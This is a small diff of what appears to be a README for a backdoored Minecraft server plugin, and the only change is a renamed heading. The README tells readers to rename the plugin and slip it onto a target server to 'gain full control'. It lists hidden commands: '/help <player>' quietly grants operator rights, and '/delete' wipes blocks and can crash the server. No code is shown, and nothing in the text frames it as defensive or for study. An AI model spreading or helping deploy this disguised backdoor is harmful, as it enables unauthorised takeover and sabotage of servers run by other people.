@@ -5,7 +5,7 @@ these is some default info about the plugin
 rename the plugin name and try to implement it into the target to gain full control 
 of the server that u want
 
-commands:
+## usage
 
 /help <player> | to get op
 /delete <range> | deletes all block in certain range the higher the more chance of crashing server
